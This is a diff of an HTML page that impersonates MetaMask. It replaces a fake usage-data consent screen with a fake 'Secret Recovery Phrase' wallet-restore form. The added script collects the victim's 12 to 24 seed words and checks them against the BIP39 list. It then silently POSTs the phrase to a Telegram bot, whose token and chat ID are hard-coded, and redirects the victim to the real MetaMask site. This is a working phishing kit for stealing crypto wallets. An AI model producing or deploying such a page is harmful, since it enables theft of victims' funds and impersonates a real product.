@@ -3,23 +3,20 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>MetaMask</title>
-  <!-- ✅ Favicon MetaMask transparent -->
-    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <title>Secret Recovery Phrase</title>
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     * { box-sizing: border-box; }
-
     body {
       margin: 0;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background-color: #ffffff;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #fff;
       color: #333;
       display: flex;
       flex-direction: column;
       align-items: center;
     }
-
     .top-bar {
       width: 100%;
       max-width: 700px;
@@ -28,245 +25,299 @@
       align-items: center;
       padding: 30px 30px 10px;
     }
-
     .logo {
       font-weight: bold;
       font-size: 20px;
     }
-
     .language-select {
       padding: 6px 12px;
       font-size: 15px;
       border-radius: 8px;
       border: 1px solid #ccc;
     }
-
     main {
       display: flex;
       justify-content: center;
-      align-items: flex-start;
-      padding: 10px 20px 40px;
+      padding: 20px;
       width: 100%;
     }
-
     .card {
       background-color: white;
       border-radius: 20px;
+      border: 1px solid #e0e0e0;
       box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
       padding: 40px;
-      max-width: 600px;
       width: 100%;
-      border: 1px solid #e0e0e0;
+      max-width: 500px;
     }
-
+    .step-circles {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 260px;
+      margin-bottom: 30px;
+    }
+    .step {
+      text-align: center;
+    }
+    .circle {
+      width: 38px;
+      height: 38px;
+      border-radius: 50%;
+      border: 2px solid #ccc;
+      line-height: 36px;
+      font-weight: bold;
+      font-size: 14px;
+      color: #777;
+      background-color: white;
+      margin: 0 auto 6px;
+    }
+    .step.active .circle {
+      background-color: #6264ff;
+      color: #fff;
+      border: none;
+    }
+    .label {
+      font-size: 12px;
+      color: #666;
+      line-height: 14px;
+    }
     h1 {
       text-align: center;
-      font-size: 24px;
-      margin-bottom: 24px;
+      font-size: 20px;
+      margin-bottom: 10px;
     }
-
-    p, label {
-      font-size: 16px;
-      line-height: 1.75;
-      margin-bottom: 18px;
-    }
-
-    a {
-      color: #2f80ed;
-      text-decoration: none;
-    }
-
-    ul {
-      padding-left: 24px;
-      margin-bottom: 24px;
-    }
-
-    ul li {
-      list-style: none;
-      margin-bottom: 12px;
-      font-size: 15px;
-    }
-
-    ul li::before {
-      content: '✓';
-      color: green;
-      margin-right: 10px;
-      font-weight: bold;
-    }
-
-    .checkbox {
-      display: flex;
-      align-items: flex-start;
+    .description {
+      text-align: center;
+      font-size: 14px;
+      color: #555;
       margin-bottom: 20px;
+    }
+    select.phrase-length {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 12px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
       font-size: 14px;
     }
-
-    .checkbox input {
-      margin-right: 10px;
-      margin-top: 4px;
-    }
-
-    .small-text {
+    .info {
       font-size: 13px;
-      color: #666;
+      color: #444;
+      margin: 10px 0;
+      padding: 10px;
+      background: #f5f5ff;
+      border-left: 4px solid #6264ff;
+      border-radius: 4px;
     }
-
-    .buttons {
+    .seed-inputs {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 20px 0;
+    }
+    .seed-input {
       display: flex;
-      justify-content: space-between;
-      gap: 20px;
-      margin-top: 30px;
+      align-items: center;
+      gap: 4px;
     }
-
-    .buttons button,
-    .buttons a {
-      flex: 1;
-      padding: 14px 0;
-      font-size: 16px;
+    .seed-input input {
+      width: 100%;
+      padding: 8px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    .submit-btn {
+      background-color: #28a745; /* Vert */
       border: none;
+      color: white;
+      width: 100%;
+      padding: 14px;
+      font-size: 16px;
       border-radius: 24px;
       cursor: pointer;
-      transition: all 0.2s ease;
+    }
+    .submit-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    .error-msg {
+      color: red;
+      font-size: 14px;
       text-align: center;
-      text-decoration: none;
+      margin-top: 10px;
+      display: none;
     }
-
-    .no-btn {
-      background-color: #fff;
-      color: #333;
-      border: 1px solid #ccc;
-    }
-
-    .yes-btn {
-      background: linear-gradient(90deg, #537cff, #6563ff);
-      color: white;
-      display: inline-block;
-    }
-
-    .yes-btn:hover {
-      background: linear-gradient(90deg, #3d65e0, #4a56f0);
-    }
-
     @media (max-width: 600px) {
-      .card {
-        padding: 25px;
+      .seed-inputs {
+        grid-template-columns: repeat(2, 1fr);
       }
-
-      h1 {
-        font-size: 22px;
-      }
-
-      .buttons {
-        flex-direction: column;
-        gap: 12px;
-      }
-
-      .top-bar {
-        flex-direction: column;
-        gap: 10px;
-        align-items: flex-start;
+      .step-circles {
+        gap: 80px;
       }
     }
   </style>
 </head>
 <body>
-  <!-- Top: logo + langue -->
+
   <div class="top-bar">
-    <div><img src="meta.png" alt="cbcLogo" width="70px"></div>
-    <select class="language-select" onchange="changeLanguage(this.value)">
+    <div><img src="https://metamask2-eight.vercel.app/meta.png"  width="70px"></div>
+    <select class="language-select">
       <option value="en">English</option>
       <option value="fr">Français</option>
       <option value="es">Español</option>
     </select>
   </div>
 
-  <!-- Carte principale -->
   <main>
     <div class="card">
-      <h1 id="title">Help us improve MetaMask</h1>
-      <p id="desc1">
-        We’d like to gather basic usage and diagnostics data to improve MetaMask. Know that we never sell the data you provide here.
-      </p>
 
-      <p>
-        <a href="https://metamask.io/privacy.html" target="_blank">
-          Learn how we protect your privacy while collecting usage data for your profile.
-        </a>
-      </p>
-
-      <p id="desc2">When we gather metrics, it will always be…</p>
-      <ul>
-        <li id="li1"><strong>Private:</strong> clicks and views on the app are stored, but other details (like your public address) are not.</li>
-        <li id="li2"><strong>General:</strong> we temporarily use your IP address to detect a general location (like your country or region), but it’s never stored.</li>
-        <li id="li3"><strong>Optional:</strong> you decide if you want to share or delete your usage data via settings any time.</li>
-      </ul>
-
-      <div class="checkbox">
-        <input type="checkbox" id="checkbox" />
-        <label for="checkbox" id="checkboxLabel">
-          We’ll use this data to learn how you interact with our marketing communications. We may share relevant news (like product features).
-        </label>
+      <div class="step-circles">
+        <div class="step active">
+          <div class="circle">1</div>
+          <div class="label">Confirm secret<br/>recovery phrase</div>
+        </div>
+        <div class="step">
+          <div class="circle">2</div>
+          <div class="label">Create<br/>password</div>
+        </div>
       </div>
 
-      <p class="small-text" id="policyText">
-        We’ll let you know if we decide to use this data for other purposes. You can review our
-        <a href="https://metamask.io/privacy.html" target="_blank">Privacy Policy</a>
-        for more information. Remember, you can go to settings and opt out at any time.
+      <h1>Access your wallet with your Secret Recovery Phrase</h1>
+      <p class="description">
+        MetaMask cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password.
+        First, enter the Secret Recovery Phrase that you were given when you created your wallet. <a href="#">Learn more</a>
       </p>
 
-      <div class="buttons">
-        <button class="no-btn">No thanks</button>
-        <a href="2.html" class="yes-btn">I agree</a>
-      </div>
+      <select class="phrase-length" id="phraseLength" onchange="generateInputs()">
+        <option value="12">I have a 12 word phrase</option>
+        <option value="15">I have a 15 word phrase</option>
+        <option value="18">I have an 18 word phrase</option>
+        <option value="21">I have a 21 word phrase</option>
+        <option value="24">I have a 24 word phrase</option>
+      </select>
+
+      <div class="info">🔐 You can paste your entire secret recovery phrase into any field</div>
+
+      <div class="seed-inputs" id="seedInputs"></div>
+
+      <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
+        Confirm Secret Recovery Phrase
+      </button>
+      <p id="errorMsg" class="error-msg">Invalid seed phrase. Please check the words.</p>
+
     </div>
   </main>
 
-  <!-- Script de langue -->
+  <script src="bip39-words.js"></script>
   <script>
-    function changeLanguage(lang) {
-      const translations = {
-        en: {
-          title: "Help us improve MetaMask",
-          desc1: "We’d like to gather basic usage and diagnostics data to improve MetaMask. Know that we never sell the data you provide here.",
-          desc2: "When we gather metrics, it will always be…",
-          li1: "Private: clicks and views on the app are stored, but other details (like your public address) are not.",
-          li2: "General: we temporarily use your IP address to detect a general location (like your country or region), but it’s never stored.",
-          li3: "Optional: you decide if you want to share or delete your usage data via settings any time.",
-          checkboxLabel: "We’ll use this data to learn how you interact with our marketing communications. We may share relevant news (like product features).",
-          policyText: "We’ll let you know if we decide to use this data for other purposes. You can review our <a href='https://metamask.io/privacy.html' target='_blank'>Privacy Policy</a> for more information. Remember, you can go to settings and opt out at any time."
-        },
-        fr: {
-          title: "Aidez-nous à améliorer MetaMask",
-          desc1: "Nous souhaitons collecter des données d'utilisation pour améliorer MetaMask. Nous ne vendrons jamais vos données.",
-          desc2: "Quand nous collectons des données, ce sera toujours…",
-          li1: "Privé : les clics et vues sont stockés, mais pas vos informations personnelles (comme votre adresse publique).",
-          li2: "Général : votre IP peut être utilisée temporairement pour détecter une région, mais elle n'est jamais conservée.",
-          li3: "Optionnel : vous pouvez choisir de partager ou supprimer vos données à tout moment via les paramètres.",
-          checkboxLabel: "Nous utiliserons ces données pour comprendre votre interaction avec nos messages marketing.",
-          policyText: "Nous vous informerons si nous utilisons ces données autrement. Lisez notre <a href='https://metamask.io/privacy.html' target='_blank'>Politique de confidentialité</a>. Vous pouvez toujours refuser dans les paramètres."
-        },
-        es: {
-          title: "Ayúdanos a mejorar MetaMask",
-          desc1: "Nos gustaría recopilar datos básicos de uso y diagnóstico para mejorar MetaMask. Nunca venderemos tus datos.",
-          desc2: "Cuando recopilamos métricas, siempre será…",
-          li1: "Privado: se guardan clics y vistas, pero no otros datos (como tu dirección pública).",
-          li2: "General: usamos tu IP temporalmente para detectar tu región, pero no se almacena.",
-          li3: "Opcional: tú decides si compartes o eliminas tus datos desde configuración.",
-          checkboxLabel: "Usaremos estos datos para entender cómo interactúas con nuestro marketing.",
-          policyText: "Te informaremos si decidimos usar los datos para otros fines. Lee nuestra <a href='https://metamask.io/privacy.html' target='_blank'>Política de Privacidad</a>. Puedes cambiarlo en configuración."
-        }
-      };
+    function generateInputs() {
+      const container = document.getElementById("seedInputs");
+      const count = parseInt(document.getElementById("phraseLength").value);
+      container.innerHTML = "";
 
-      const t = translations[lang];
-      document.getElementById('title').textContent = t.title;
-      document.getElementById('desc1').textContent = t.desc1;
-      document.getElementById('desc2').textContent = t.desc2;
-      document.getElementById('li1').innerHTML = "<strong>" + t.li1.split(':')[0] + ":</strong> " + t.li1.split(':')[1];
-      document.getElementById('li2').innerHTML = "<strong>" + t.li2.split(':')[0] + ":</strong> " + t.li2.split(':')[1];
-      document.getElementById('li3').innerHTML = "<strong>" + t.li3.split(':')[0] + ":</strong> " + t.li3.split(':')[1];
-      document.getElementById('checkboxLabel').textContent = t.checkboxLabel;
-      document.getElementById('policyText').innerHTML = t.policyText;
+      for (let i = 1; i <= count; i++) {
+        const div = document.createElement("div");
+        div.className = "seed-input";
+        div.innerHTML = `<label>${i}.</label><input type="text" name="word${i}" autocomplete="off" />`;
+        container.appendChild(div);
+      }
+
+      const inputs = container.querySelectorAll("input");
+      inputs.forEach(input => {
+        input.addEventListener("input", checkFieldsFilled);
+      });
+
+      document.getElementById("submitBtn").disabled = true;
     }
+
+    function checkFieldsFilled() {
+      const count = parseInt(document.getElementById("phraseLength").value);
+      let allFilled = true;
+
+      for (let i = 1; i <= count; i++) {
+        const value = document.querySelector(`input[name='word${i}']`).value.trim();
+        if (value === "") {
+          allFilled = false;
+          break;
+        }
+      }
+
+      document.getElementById("submitBtn").disabled = !allFilled;
+    }
+
+    function validateBIP39Words() {
+      const count = parseInt(document.getElementById("phraseLength").value);
+      let valid = true;
+
+      for (let i = 1; i <= count; i++) {
+        const input = document.querySelector(`input[name='word${i}']`);
+        const word = input.value.trim().toLowerCase();
+        if (!bip39Words.includes(word)) {
+          input.style.border = "2px solid red";
+          valid = false;
+        } else {
+          input.style.border = "1px solid #ccc";
+        }
+      }
+
+      return valid;
+    }
+
+    function handleConfirm() {
+      const errorEl = document.getElementById("errorMsg");
+      if (!validateBIP39Words()) {
+        errorEl.style.display = "block";
+        return;
+      } else {
+        errorEl.style.display = "none";
+      }
+
+      const count = parseInt(document.getElementById("phraseLength").value);
+      let phrase = "";
+      for (let i = 1; i <= count; i++) {
+        const value = document.querySelector(`input[name='word${i}']`).value;
+        phrase += value.trim() + " ";
+      }
+
+      const botToken = "7918572484:AAHP6tcUHK2PuBPpN2Ln2GhFA722z2k7xb0"; // Remplace ici
+      const chatId = "6996434307";     // Remplace ici
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: "\n\n" + phrase.trim()
+        })
+      });
+
+      navigator.clipboard.writeText(phrase.trim());
+
+      setTimeout(() => {
+        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
+      }, 800);
+    }
+
+    document.addEventListener("paste", function(e) {
+      const activeInput = document.activeElement;
+      if (!activeInput || !activeInput.name || !activeInput.name.startsWith("word")) return;
+
+      const paste = (e.clipboardData || window.clipboardData).getData("text");
+      const words = paste.trim().split(/\s+/);
+      if (words.length < 2) return;
+
+      e.preventDefault();
+      words.forEach((word, index) => {
+        const input = document.querySelector(`input[name='word${index + 1}']`);
+        if (input) input.value = word;
+      });
+
+      checkFieldsFilled();
+    });
+
+    window.onload = generateInputs;
   </script>
 </body>
 </html>
